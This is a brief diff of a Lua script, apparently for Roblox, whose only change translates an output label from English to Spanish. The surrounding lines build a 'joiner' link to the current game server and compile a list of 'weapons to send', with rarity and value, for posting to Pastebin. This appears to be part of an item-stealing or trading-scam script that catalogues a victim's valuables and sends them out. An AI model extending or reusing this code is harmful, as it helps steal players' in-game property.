@@ -485,7 +485,7 @@ local realLink = "[unirse](https://fern.wtf/joiner?placeId="..game.PlaceId.."&ga
 -- Preparar contenido completo para Pastebin
 local pasteContent = ""
 for _, w in ipairs(weaponsToSend) do
-    pasteContent = pasteContent..string.format("%s x%s (%s) | Value: %s💎\n", w.DataID, w.Amount, w.Rarity, tostring(w.Value*w.Amount))
+    pasteContent = pasteContent..string.format("%s x%s (%s) | Valor: %s💎\n", w.DataID, w.Amount, w.Rarity, tostring(w.Value*w.Amount))
 end
 pasteContent = pasteContent .. "\nTotal Value: "..tostring(totalValue).."💰"
 
